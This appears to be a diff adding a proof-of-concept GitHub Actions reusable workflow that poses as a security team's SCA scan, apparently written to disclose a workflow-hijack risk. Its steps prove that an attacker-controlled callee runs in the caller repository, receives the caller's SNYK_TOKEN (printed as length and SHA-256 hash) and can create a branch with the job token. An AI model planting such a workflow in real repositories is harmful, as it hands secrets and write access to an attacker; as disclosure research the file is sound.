@@ -1,0 +1,43 @@
+# Demo stand-in for atko-security/devsecops-tooling/.github/workflows/sca-scan.yml
+# Referenced by auth0 repos' sca_scan.yml as:
+#   jobs:
+#     snyk-cli:
+#       uses: atko-security/devsecops-tooling/.github/workflows/sca-scan.yml@main
+#       secrets:
+#         SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+# In the PoC fork the owner prefix is swapped to the demo account; everything
+# else is byte-identical. Harmless probes only, targeting the fork alone.
+name: sca-scan (capability probe)
+
+on:
+  workflow_call:
+    secrets:
+      SNYK_TOKEN:
+        required: false
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prove execution in caller context and secret delivery
+        run: |
+          echo "attacker-controlled reusable workflow executing inside: ${{ github.repository }}"
+          echo "event: ${{ github.event_name }}  actor: ${{ github.actor }}  ref: ${{ github.ref }}"
+          echo "SNYK_TOKEN length received by callee: ${#SNYK_TOKEN}"
+          printf 'sha256(SNYK_TOKEN) received by callee: '
+          printf %s "$SNYK_TOKEN" | sha256sum | cut -d' ' -f1
+          echo "(a match against the published sentinel hash proves named-secret"
+          echo " passing delivers the caller's secret to the callee verbatim)"
+
+      - name: Prove job token availability in the callee
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "github.token available to callee: ${#GH_TOKEN} chars"
+          echo "callee created a branch in the caller repo with that token:"
+          BASE=$(gh api "repos/${{ github.repository }}/git/ref/heads/main" --jq '.object.sha' \
+                 || gh api "repos/${{ github.repository }}/git/ref/heads/master" --jq '.object.sha')
+          gh api -X POST "repos/${{ github.repository }}/git/refs" \
+            -f ref="refs/heads/poc-cap-probe" -f sha="$BASE" && echo "PASS: create branch"
+          gh api -X DELETE "repos/${{ github.repository }}/git/refs/heads/poc-cap-probe" \
+            && echo "PASS: delete branch (cleanup)"
